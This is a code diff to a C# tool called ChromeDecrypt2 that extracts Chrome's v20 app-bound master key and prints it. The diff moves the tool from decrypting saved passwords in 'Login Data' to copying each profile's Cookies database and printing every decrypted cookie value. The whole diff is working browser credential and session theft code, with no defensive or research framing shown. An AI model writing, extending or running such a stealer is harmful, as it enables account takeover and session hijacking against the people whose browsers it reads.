@@ -372,6 +372,25 @@ namespace ChromeDecrypt2
             string chrome_path = string.Format("{0}\\AppData\\Local\\Google\\Chrome\\User Data", user_profile);
             string user_default_path = string.Format("{0}\\Default", chrome_path);
             List<String> chrome_users_dire = new List<string>();
+            
+            if (string.IsNullOrEmpty(user_profile))
+            {
+                Console.WriteLine("[!] USERPROFILE is not set; cannot locate Chrome data.");
+                return;
+            }
+
+            if (!Directory.Exists(chrome_path))
+            {
+                Console.WriteLine($"[!] Chrome profile directory not found: {chrome_path}");
+                return;
+            }
+
+            if (!File.Exists(local_state_path))
+            {
+                Console.WriteLine($"[!] Local State file not found: {local_state_path}");
+                return;
+            }
+
             chrome_users_dire.Add(user_default_path);
             foreach (string file in Directory.GetDirectories(chrome_path))
             {
@@ -469,54 +488,82 @@ namespace ChromeDecrypt2
             byte[] v20_master_key = DecryptBlob(parsed);
             Console.WriteLine($"AES KEY:{BitConverter.ToString(v20_master_key)}");
 
-            var results = new List<Tuple<string, string, byte[]>>();
+            var cookieResults = new List<Tuple<string, string, byte[]>>();
 
             //获取chrome用户目录文件夹
             if (chrome_users_dire.Count > 0)
             {
                 for (int i = 0; i < chrome_users_dire.Count; i++)
                 {
-                    string login_data_path = String.Format("{0}\\Login Data", chrome_users_dire[i]);
-                    //string cookies_path = String.Format("{0}\\NetWork\\Cookies", chrome_users_dire[i]);
-                    //Console.Write(login_data_path);
+                    string cookies_path = String.Format("{0}\\Network\\Cookies", chrome_users_dire[i]);
 
-                    string connstr = $"Data Source={login_data_path};Read Only=True;";
-                    using (var con = new SQLiteConnection(connstr))
+                    if (!File.Exists(cookies_path))
                     {
-                        con.Open();
-                        using (var cmd = con.CreateCommand())
+                        Console.WriteLine($"[!] Cookie database not found: {cookies_path}");
+                        continue;
+                    }
+
+                    string tempCopy = Path.Combine(Path.GetTempPath(), $"chrome_cookies_{Guid.NewGuid():N}.db");
+
+                    try
+                    {
+                        File.Copy(cookies_path, tempCopy, true);
+
+                        string connstr = $"Data Source={tempCopy};Read Only=True;";
+                        using (var con = new SQLiteConnection(connstr))
                         {
-                            cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins";
-                            using (var reader = cmd.ExecuteReader())
+                            con.Open();
+                            using (var cmd = con.CreateCommand())
                             {
-                                while (reader.Read())
+                                cmd.CommandText = "SELECT host_key,name,encrypted_value FROM cookies";
+                                using (var reader = cmd.ExecuteReader())
                                 {
-                                    string origin_url = reader.GetString(0);
-                                    string username_value = reader.GetString(1);
-                                    byte[] encryptedValue = (byte[])reader["password_value"];
-                                    if (encryptedValue.Length >= 3 &&
-                                        encryptedValue[0] == (byte)'v' &&
-                                        encryptedValue[1] == (byte)'2' &&
-                                        encryptedValue[2] == (byte)'0')
+                                    while (reader.Read())
                                     {
-                                        results.Add(Tuple.Create(origin_url, username_value, encryptedValue));
+                                        string host = reader.GetString(0);
+                                        string name = reader.GetString(1);
+                                        byte[] encryptedValue = (byte[])reader["encrypted_value"];
+                                        if (encryptedValue.Length >= 3 &&
+                                            encryptedValue[0] == (byte)'v' &&
+                                            encryptedValue[1] == (byte)'2' &&
+                                            encryptedValue[2] == (byte)'0')
+                                        {
+                                            cookieResults.Add(Tuple.Create(host, name, encryptedValue));
+                                        }
                                     }
                                 }
                             }
+                            con.Close();
                         }
-                        con.Close();
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[!] Failed to process cookies for {cookies_path}: {ex.Message}");
+                    }
+                    finally
+                    {
+                        try
+                        {
+                            if (File.Exists(tempCopy))
+                            {
+                                File.Delete(tempCopy);
+                            }
+                        }
+                        catch
+                        {
+                            // 忽略临时文件删除错误，但不要阻止其他 profile 处理
+                        }
                     }
                 }
             }
-            //
-            foreach (var item in results)
+
+            foreach (var item in cookieResults)
             {
-                string url = item.Item1;
-                string username = item.Item2;
-                byte[] password = item.Item3;
-                string new_password = DecryptCookieV20(password, v20_master_key);
-                Console.WriteLine($"Host: {url}, Name: {username}, Encrypted Value: {new_password}");
-                // 如果你要解密 encryptedValue，可以在这里调用你的解密函数
+                string host = item.Item1;
+                string name = item.Item2;
+                byte[] encryptedValue = item.Item3;
+                string decrypted_value = DecryptCookieV20(encryptedValue, v20_master_key);
+                Console.WriteLine($"Host: {host}, Name: {name}, Decrypted Value: {decrypted_value}");
             }
         }
     }
